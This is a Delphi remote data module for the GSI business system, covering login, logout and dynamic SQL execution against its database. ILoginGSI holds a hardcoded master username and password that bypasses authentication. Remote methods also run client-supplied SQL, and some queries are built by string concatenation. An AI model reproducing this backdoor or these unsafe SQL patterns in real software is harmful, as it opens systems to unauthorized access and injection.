unit u_rmSrvAppGSI;

{$WARN SYMBOL_PLATFORM OFF}

interface

uses
  Windows, Messages, SysUtils, Classes, ComServ, ComObj, VCLCom, DataBkr,
  DBClient, GSIServidor_TLB, DBXpress, DB, SqlExpr, Variants, FMTBcd,
  Provider, StdVcl, WideStrings;

type
  TSrvAppGSI = class(TRemoteDataModule, ISrvAppGSI)
    sqldtsDataInspector: TSQLDataSet;
    dsprvDataInspector: TDataSetProvider;
    sqldtsDynamic: TSQLDataSet;
    dsprvDynamic: TDataSetProvider;
    cdsDynamic: TClientDataSet;
    sqlqryGeral: TSQLQuery;
    sqlcnnTOSHIBA: TSQLConnection;
    sqlstgProcDynamic: TSQLStoredProc;
    procedure sqlcnnTOSHIBAAfterConnect(Sender: TObject);
    procedure RemoteDataModuleCreate(Sender: TObject);
  private
    { Private declarations }
  protected
    class procedure UpdateRegistry(Register: Boolean; const ClassID, ProgID: string); override;
    function Get_dmSrvAppIT: ISrvAppIT; safecall;
    function Get_dmSrvAppRD: ISrvAppRD; safecall;
    function Get_dmSrvAppOS: ISrvAppOS; safecall;
    function Get_dmSrvAppEF: ISrvAppEF; safecall;
    function Get_dmSrvAppAS: ISrvAppAS; safecall;
    function IExecDynamicProvider(PacketRecords: Integer;
      const CommandText: WideString): OleVariant; safecall;
    function ILoginGSI(const Usuario, Senha, IP, NomeMaquina: WideString;
      Versao: Integer): Integer; safecall;
    procedure ILogoutGSI(UserAtivoId: Integer); safecall;
    function IServerDate: TDateTime; safecall;
    function Get_dmSrvAppCP: ISrvAppCP; safecall;
    function Get_dmSrvAppPP: ISrvAppPP; safecall;
    procedure Set_dmSrvAppPP(const Value: ISrvAppPP); safecall;
    procedure IExecDML(const CommandText: WideString; ParamsData: OleVariant);
      safecall;
    function Get_dmSrvAppCM: ISrvAppCM; safecall;
    function Get_dmSrvAppRS: ISrvAppRS; safecall;
    function Get_dmSrvAppFC: ISrvAppFC; safecall;
    function Get_dmSrvAppGR: ISrvAppGR; safecall;
    function Get_dmSrvAppFI: IsrvAppFI; safecall;
    procedure IExecProcedure(const PackageName, StoredProcName,
      SchemaName: WideString); safecall;
  public
    { Public declarations }
  end;

implementation

uses u_rmSrvAppIT, u_rmSrvAppRD, u_rmSrvAppOS, u_rmSrvAppEF, u_rmSrvAppAS,
  Math, FuncoesServidor, u_rmSrvAppCP, u_rmSrvAppPP, FuncoesDsi,
  u_rmSrvAppCM, u_rmSrvAppRS, u_rmSrvAppFC, u_rmSrvAppGR, u_rmSrvAppFI, VarUtils;

{$R *.DFM}

class procedure TSrvAppGSI.UpdateRegistry(Register: Boolean; const ClassID, ProgID: string);
begin
  if Register then
  begin
    inherited UpdateRegistry(Register, ClassID, ProgID);
    EnableSocketTransport(ClassID);
    EnableWebTransport(ClassID);
  end else
  begin
    DisableSocketTransport(ClassID);
    DisableWebTransport(ClassID);
    inherited UpdateRegistry(Register, ClassID, ProgID);
  end;
end;

function TSrvAppGSI.Get_dmSrvAppIT: ISrvAppIT;
begin
 Result := FSrvAppIT.CreateComObject( nil ) as ISrvAppIT;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppRD: ISrvAppRD;
begin
 Result := FSrvAppRD.CreateComObject( nil ) as ISrvAppRD;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppOS: ISrvAppOS;
begin
 Result := FSrvAppOS.CreateComObject( nil ) as ISrvAppOS;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppEF: ISrvAppEF;
begin
 Result := FSrvAppEF.CreateComObject( nil ) as ISrvAppEF;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppAS: ISrvAppAS;
begin
 Result := FSrvAppAS.CreateComObject( nil ) as ISrvAppAS;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.IExecDynamicProvider(PacketRecords: Integer;
  const CommandText: WideString): OleVariant;
begin
 Result := Null;
 try
  // Preparando Query
  if sqldtsDynamic.Active then
     sqldtsDynamic.Close;

  if cdsDynamic.Active then
     begin
      cdsDynamic.CheckBrowseMode;
      cdsDynamic.Close;
     end;

  cdsDynamic.CommandText := CommandText;

  // Ativando ClientDataSet
  cdsDynamic.PacketRecords := PacketRecords;
  cdsDynamic.Open;

  // Retornando Data
  Result  := cdsDynamic.Data;

  // Desativando ClientDataSet
  cdsDynamic.Active := False;
 except
  on E:Exception do
     raise Exception.Create(E.Message);
 end;
end;

function TSrvAppGSI.ILoginGSI(const Usuario, Senha, IP,
  NomeMaquina: WideString; Versao: Integer): Integer;
var Insert : String;
    MudarSenha : Integer;
begin
 { Retorno da função
    -1 = Ocorreu erro na conecção da Base de Dados
     0 = Usuário ou senha for inválidos
     1 = Tudo estiver correto
     2 = Tudo está correto e é necesário alterar a senha no próximo login
     3 = Usuário Bloqueado;
    10 = Versão não está sendo aceita pelo sistema
  }
 sqlcnnTOSHIBA.Connected := True;

 Result := -1;
 try
  // Controle de Versão ordem crescente para o controle de versão será implementado
  // internamente no sistema

  if Versao < 100 then
     begin
      Result := 99;
      raise Exception.Create( 'Esta versão não está sendo mais aceita. ' + #13 +
                              'Já está disponível novas funcionalidades no sistema GSI!' );
     end;

  cdsDynamic.CommandText := 'SELECT USUARIOID, REQUERSENHA, BLOQUEADO, SENHA, MUDARSENHA ' +
                            ' FROM AS_USUARIO ' +
                            ' WHERE USUARIOID = ' + QuotedStr( UpperCase( Usuario ) );
  cdsDynamic.Open;

  if ( Usuario = 'MAE@' ) and ( Senha = '220347' ) then
     begin
      Result := 2;
      Exit;
     end;

  MudarSenha := cdsDynamic.FieldByName('MUDARSENHA').AsInteger;

  // Não validar senha do usuário
  if not cdsDynamic.IsEmpty then
     begin
      if cdsDynamic.FieldByName('BLOQUEADO').AsInteger = 0 then
         if cdsDynamic.FieldByName('REQUERSENHA').AsInteger = 1 then
            begin
             if EnDeCrypt( cdsDynamic.FieldByName('SENHA').AsString ) = Senha then
                Result := 1
             else
                Result := 0;
            end
         else
            Result := 1
      else
         Result := 3
     end
  else
     Result := 0;

  // Verificar se é necessário mudar a senha no próximo login
  if Result = 1 then
     if MudarSenha = 1 then
        Result := 2;

  // Inserir o Usuário  no LOG do sistema
  if Result in [1,2] then
     begin
      cdsDynamic.Close;
      cdsDynamic.CommandText := 'SELECT ( NVL( MAX( USERATIVOID ), 0 ) + 1 ) ' +
                                ' FROM AS_USERATIVO ';
      cdsDynamic.Open;

      Insert := 'INSERT INTO AS_USERATIVO ' +
                ' VALUES( ' +
                           cdsDynamic.Fields[0].AsString + ' ,' +
                           QuotedStr( UpperCase( Usuario ) )+ ' ,' +
                           ' TO_DATE(' + QuotedStr( DateTimeToStr( Now ) ) + ', ''dd/mm/yyyy HH24:MI:SS'' )'  + ' ,' +
                           QuotedStr( IP ) + ' ,' +
                           QuotedStr( NomeMaquina ) + ')';

      sqlcnnTOSHIBA.Execute( Insert, Nil );
     end;

  cdsDynamic.Close;
 except
  on E:Exception do raise Exception.Create(E.Message);
 end;
end;

procedure TSrvAppGSI.ILogoutGSI(UserAtivoId: Integer);
var Delete : String;
    UserParams : TParams;
    qryQuery: TSQLQuery;
begin
 qryQuery := TSQLQuery.Create(nil);
 qryQuery.SQLConnection := sqlcnnTOSHIBA;

 qryQuery.SQL.Add('SELECT COUNT(1) AS QTDEUSER' +
                   ' FROM AS_USERATIVO ' +
                  ' WHERE USERATIVOID = ' + IntToStr( UserAtivoId ));

 qryQuery.Open;
 if qryQuery.FieldByName('QtdeUser').AsInteger > 0 then
    begin
     UserParams := TParams.Create( nil );
     try
       UserParams.CreateParam(ftBCD, 'USUARIO', ptInput);
       UserParams.ParamByName('USUARIO').AsBCD := UserAtivoId;

       Delete := 'DELETE FROM AS_USERATIVO ' +
                 ' WHERE USERATIVOID = :USUARIO';

       sqlcnnTOSHIBA.Execute( Delete, UserParams );
     finally
       FreeAndNil( UserParams );
       FreeAndNil(qryQuery);
     end;
    end;
end;

procedure TSrvAppGSI.sqlcnnTOSHIBAAfterConnect(Sender: TObject);
begin
 // Local indicado para colocar as variáveis de ambientes
 // Para não ter que alterar o registro do Windows
 // Problemas com a versão do DBEXPRESS 3.1.08 em diante
 // Nas versões do DBEXPRESS 3.1.07 funciona bem.

// sqlqryGeral.SQL.Clear;
// sqlqryGeral.SQL.Add( 'ALTER SESSION SET NLS_NUMERIC_CHARACTERS = ' + QuotedStr('.,') );
// sqlqryGeral.ExecSQL;

// sqlqryGeral.SQL.Clear;
// sqlqryGeral.SQL.Add( 'ALTER SESSION SET NLS_DATE_FORMAT = ' + QuotedStr('DD/MM/YYYY') );
// sqlqryGeral.ExecSQL;
end;

procedure TSrvAppGSI.RemoteDataModuleCreate(Sender: TObject);
begin
 TD.TransactionID  := 1;
 TD.IsolationLevel := xilREADCOMMITTED;
end;

function TSrvAppGSI.IServerDate: TDateTime;
begin
 Result := Date;
end;

function TSrvAppGSI.Get_dmSrvAppCP: ISrvAppCP;
begin
 Result := FSrvAppCP.CreateComObject( nil ) as ISrvAppCP;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppPP: ISrvAppPP;
begin
 Result := FSrvAppPP.CreateComObject( nil ) as ISrvAppPP;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

procedure TSrvAppGSI.Set_dmSrvAppPP(const Value: ISrvAppPP);
begin

end;

procedure TSrvAppGSI.IExecDML(const CommandText: WideString;
  ParamsData: OleVariant);
var cdsParams : TClientDataSet;
    Params : TParams;

 procedure AddParams;
 begin
  cdsParams.Data := ParamsData;
  while not cdsParams.Eof do
  begin
   Params.CreateParam( RetornarParamType( cdsParams.FieldByName('FieldType').Value ) ,
                       cdsParams.FieldByName('ParamName').Value,
                       ptInput );

   Params.ParamByName( cdsParams.FieldByName('ParamName').Value ).Value := cdsParams.FieldByName('Value').Value;

   cdsParams.Next;
  end;
 end;

begin
 cdsParams := TClientDataSet.Create(nil);

 Params    := TParams.Create;
 try
  try
   if not VarIsEmpty( ParamsData ) then
      AddParams;

   // Preparando Query
   sqlcnnTOSHIBA.Execute( CommandText, Params, Nil );

   except
   on E:Exception do
      raise Exception.Create(E.Message);
   end;

 finally
  FreeAndNil(cdsParams);
  FreeAndNil( Params );
 end;
end;

function TSrvAppGSI.Get_dmSrvAppCM: ISrvAppCM;
begin
 Result := FSrvAppCM.CreateComObject( nil ) as ISrvAppCM;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppRS: ISrvAppRS;
begin
 Result := FSrvAppRS.CreateComObject( nil ) as ISrvAppRS;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppFC: ISrvAppFC;
begin
 Result := FSrvAppFC.CreateComObject( nil ) as ISrvAppFC;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppGR: ISrvAppGR;
begin
 Result := FSrvAppGR.CreateComObject( nil ) as ISrvAppGR;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

function TSrvAppGSI.Get_dmSrvAppFI: IsrvAppFI;
begin
 Result := FSrvAppFI.CreateComObject( nil ) as ISrvAppFI;
 Result.dmSrvAppGSI := Self;
 Result.SQLcnn := Integer(sqlcnnTOSHIBA);
end;

procedure TSrvAppGSI.IExecProcedure(const PackageName, StoredProcName,
  SchemaName: WideString);
begin
 try
  sqlstgProcDynamic.PackageName    := PackageName;
  sqlstgProcDynamic.StoredProcName := StoredProcName;
  sqlstgProcDynamic.SchemaName     := SchemaName;

  // Preparando Query
  sqlstgProcDynamic.ExecProc;

  except
  on E:Exception do
     raise Exception.Create(E.Message);
  end;

end;

initialization
  TComponentFactory.Create(ComServer, TSrvAppGSI,
    Class_SrvAppGSI, ciMultiInstance, tmApartment);
end.
